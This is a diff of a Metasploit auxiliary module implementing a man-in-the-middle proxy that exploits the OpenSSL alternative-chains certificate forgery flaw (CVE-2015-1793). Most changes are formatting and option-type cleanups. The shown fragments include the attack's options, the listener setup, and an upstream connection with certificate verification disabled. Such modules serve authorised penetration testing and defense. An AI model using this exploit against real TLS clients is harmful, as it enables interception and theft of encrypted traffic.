@@ -10,8 +10,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'OpenSSL Alternative Chains Certificate Forgery MITM Proxy',
-      'Description'    => %q{
+      'Name' => 'OpenSSL Alternative Chains Certificate Forgery MITM Proxy',
+      'Description' => %q{
         This module exploits a logic error in OpenSSL by impersonating the server
         and sending a specially-crafted chain of certificates, resulting in
         certain checks on untrusted certificates to be bypassed on the client,
@@ -26,28 +26,25 @@ class MetasploitModule < Msf::Auxiliary
         X509_V_ERR_UNABLE_TO_GET_ISSUER_CERT_LOCALLY. This module requires an
         active man-in-the-middle attack.
       },
-      'Author'      =>
-        [
-          'David Benjamin', # Vulnerability discovery
-          'Adam Langley', # Vulnerability discovery
-          'Ramon de C Valle' # Metasploit module
-        ],
+      'Author' => [
+        'David Benjamin', # Vulnerability discovery
+        'Adam Langley', # Vulnerability discovery
+        'Ramon de C Valle' # Metasploit module
+      ],
       'License' => MSF_LICENSE,
-      'Actions'     =>
-        [
-          [ 'Service', 'Description' => 'Run MITM proxy' ]
-        ],
-      'PassiveActions' =>
-        [
-          'Service'
-        ],
-      'DefaultAction'  => 'Service',
+      'Actions' => [
+        [ 'Service', 'Description' => 'Run MITM proxy' ]
+      ],
+      'PassiveActions' => [
+        'Service'
+      ],
+      'DefaultAction' => 'Service',
       'References' => [
         ['CVE', '2015-1793'],
         ['CWE', '754'],
         ['URL', 'http://git.openssl.org/?p=openssl.git;a=commit;h=f404943bcab4898d18f3ac1b36479d1d7bbbb9e6']
       ],
-      'DisclosureDate' => 'Jul 9 2015'
+      'DisclosureDate' => '2015-07-09'
     )
 
     register_options(
@@ -59,9 +56,10 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('SUBJECT', [ false, 'The subject field for the fake certificate', '/C=US/ST=California/L=Mountain View/O=Example Inc/CN=*.example.com']),
         OptString.new('HOST', [ true, 'The server address', nil]),
         OptPort.new('PORT', [ true, 'The server port', 443]),
-        OptString.new('SRVHOST', [ true, 'The proxy address', '0.0.0.0']),
+        OptAddress.new('SRVHOST', [ true, 'The proxy address', '0.0.0.0']),
         OptString.new('SRVPORT', [ true, 'The proxy port', 443])
-      ])
+      ]
+    )
   end
 
   def cleanup
@@ -82,7 +80,7 @@ class MetasploitModule < Msf::Auxiliary
   def run
     host = datastore['HOST']
     port = datastore['PORT']
-    local_host = datastore['SRVHOST']
+    local_host = srvhost
     local_port = datastore['SRVPORT']
 
     root_ca_name = OpenSSL::X509::Name.parse('/C=US/O=Root Inc./CN=Root CA')
@@ -148,11 +146,12 @@ class MetasploitModule < Msf::Auxiliary
       'LocalHost' => local_host,
       'LocalPort' => local_port,
       'SSLContext' => context,
-      'Context'   =>
+      'Context' =>
         {
-          'Msf'        => framework,
+          'Msf' => framework,
           'MsfExploit' => self
-        })
+        }
+    )
 
     print_status('Listening on %s:%d' % [local_host, local_port])
 
@@ -167,13 +166,14 @@ class MetasploitModule < Msf::Auxiliary
         server = Rex::Socket::Tcp.create(
           'PeerHost' => host,
           'PeerPort' => port,
-          'SSL'      => true,
+          'SSL' => true,
           'SSLVerifyMode' => 'NONE',
-          'Context'  =>
+          'Context' =>
             {
-              'Msf'        => framework,
+              'Msf' => framework,
               'MsfExploit' => self
-            })
+            }
+        )
         add_socket(server)
 
         print_status('Connected to %s:%d' % [host, port])
@@ -198,7 +198,6 @@ class MetasploitModule < Msf::Auxiliary
               end
             end
           end
-
         rescue EOFError, Errno::ECONNRESET
           path = store_loot(
             'tls.application_data',
